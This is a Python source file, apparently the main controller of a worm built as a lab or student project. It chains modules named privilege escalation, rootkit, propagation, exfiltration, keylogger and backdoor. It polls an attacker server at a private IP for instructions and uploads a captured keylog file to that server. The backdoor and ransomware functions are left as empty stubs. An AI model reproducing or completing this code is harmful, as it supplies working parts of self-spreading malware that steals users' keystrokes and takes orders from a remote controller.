###########################################################################################################################
####################################################     LIBRARIES     ####################################################
###########################################################################################################################

import requests
from time import sleep

from modules import privesc
from modules import rootkit
from modules import propagation
from modules import exfiltration
from modules import keylogger
from modules import backdoor
from modules import instructions

###########################################################################################################################
#################################################     INITIALIZATIONS     #################################################
###########################################################################################################################

KEYLOG_TXT_FILE = './media/keylog.txt'
ATTACKER_SERVER_IP = 'http://10.0.2.15:8000'

# Resets the current instruction so the program waits for the new one
def reset_instruction():
    try:
        response = requests.get(f'{ATTACKER_SERVER_IP}/reset_instruction')
        # Raises an HTTPError for bad responses (4xx or 5xx)
        response.raise_for_status()
        # print('\tInstruction successfully reseted!')
    except requests.exceptions.RequestException as e:
        # print(f"Error resetting the instruction: {e}")
        pass

# Erases all the content of the keylog.txt file
def reset_keylog_file():
    with open(KEYLOG_TXT_FILE, 'w'): pass

# Sends keylog.txt to the attacker machine and resets it
def send_keylog_to_attacker():
    with open(KEYLOG_TXT_FILE, 'rb') as file:
        files = {'file': (file.name, file)}
        response = requests.post(f'{ATTACKER_SERVER_IP}/upload_file', files=files)
        print(f'Status code: {response.status_code}')

    reset_keylog_file()

# Opens a backdoor with the attacker's machine
def start_backdoor(attacker_ip = None):
    if type(attacker_ip) == type(None): return

    # PLACE CODE HERE...

    return

# Closes the backdoor with the attacker's machine
def stop_backdoor(attacker_ip = None):
    if type(attacker_ip) == type(None): return

    # PLACE CODE HERE...

    return

# Deploys the ransomware
def deploy_ransomware(key = None):
    if type(key) == type(None): return

    # PLACE CODE HERE...

    return

# Deploys the ransomware
def decrypt_ransomware(key = None):
    if type(key) == type(None): return

    # PLACE CODE HERE...

    return

###########################################################################################################################
#####################################################     PROGRAM     #####################################################
###########################################################################################################################

def main():
    print("Worm just landed!")

    # map modules to function
    modules = {
        "privesc": privesc.run,
        "rootkit": rootkit.run,
        "propagation": propagation.run,
        "exfiltration": exfiltration.run,
        "keylogger": keylogger.run,
        "backdoor": backdoor.run,
        "instructions": instructions.run,
    }

    # First step
    next_step = "privesc"
    result = None

    while next_step != "clean":
        # Execute module and get result and next step
        result, next_step = modules[next_step]()
        result = result.split(' ')

        if result and len(result) >= 2:
            if result[0] == 'keylogger':
                if result[1] == 'send_log': send_keylog_to_attacker()
                elif result[1] == 'reset_log': reset_keylog_file()
    
            elif result[0] == 'backdoor':
                if len(result) >= 3:
                    if result[1] == 'start': start_backdoor(attacker_ip = result[2])
                    elif result[1] == 'stop': stop_backdoor(attacker_ip = result[2])

            elif result[0] == 'ransomware':
                if len(result) >= 3:
                    if result[1] == 'deploy': deploy_ransomware(key = result[2])
                    elif result[1] == 'decrypt': decrypt_ransomware(key = result[2])

            if result != 'no_data': reset_instruction()

            if next_step == 'instructions': sleep(10)
        else:
            print(f"[-] Module {next_step} failed!")
            break

if __name__ == "__main__":
    main()